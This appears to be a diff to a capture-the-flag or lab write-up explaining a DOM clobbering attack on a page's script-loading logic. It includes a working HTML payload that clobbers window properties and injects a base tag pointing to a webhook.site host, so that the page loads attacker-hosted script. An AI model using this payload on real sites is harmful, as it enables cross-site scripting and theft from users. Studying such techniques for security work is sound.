@@ -7,19 +7,19 @@
 Looking at usuarioNoteDetail.html
 ```js
 try{
-    if(window.isClean.isSafe.isSanitized) {
-        successScript.src = "./js/success.js";
-        successScript.onload = () => report();
-    }
+	if(window.abortError.stack.stackTrace) {
+		successScript.src = "./js/success.js";
+		successScript.onload = () => report();
+	}
 }catch{
-    successScript.src = "/js/success.js";
-    successScript.onload = () => report();
+	alert("Data SuccessFully Spawned");
 }
+document.head.appendChild(successScript);
 ```
 
-we can clobber isClean, isSafe, and isSanitized using DOM clobberring technique:
+we can clobber abortError, stack, and stackTrace using DOM clobberring technique:
 ```html
-<iframe name=isClean srcdoc="<a id=isSafe name=isSafe><a id=isSafe name=isSanitized href=controlled>"></iframe>
+<iframe name=abortError srcdoc="<a id=stack name=stack><a id=stack name=stackTrace href=controlled>"></iframe><base href='https://webhook.site/16355663-3589-4332-90dd-4a1f4ea92dc9/'>
 ```
 
 ## XSS
